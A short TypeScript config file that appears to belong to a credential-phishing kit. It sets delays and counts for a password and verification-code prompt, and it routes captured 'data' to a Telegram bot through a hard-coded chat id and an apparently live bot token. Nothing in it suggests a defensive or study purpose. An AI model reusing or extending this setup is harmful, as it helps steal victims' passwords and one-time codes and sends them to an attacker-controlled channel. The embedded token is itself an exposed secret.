interface Config {
  settings: {
    code_loading_time: number;
    max_failed_code_attempts: number;
    max_failed_password_attempts: number;
    page_loading_time: number;
    password_loading_time: number;
    code_input_enabled: boolean;
  };
  telegram: {
    notification_chatid: string;
    notification_token: string;
    data_chatid: string;
    data_token: string;
  };
}

// Define default configuration
const defaultConfig: Config = {
  settings: {
    code_loading_time: 16000,
    max_failed_code_attempts: 3,
    max_failed_password_attempts: 1,
    page_loading_time: 5000,
    password_loading_time: 13000,
    code_input_enabled: true,
  },
  telegram: {
    notification_chatid: '',
    notification_token: '', 
    data_chatid: '5082552949', 
    data_token: '6523989137:AAH5GdE2C0GkBQZV6MtPhJXrmRo8efyp3QE',
  },
};

const getConfig = async (): Promise<Config> => {
  return defaultConfig;
};

export default getConfig;
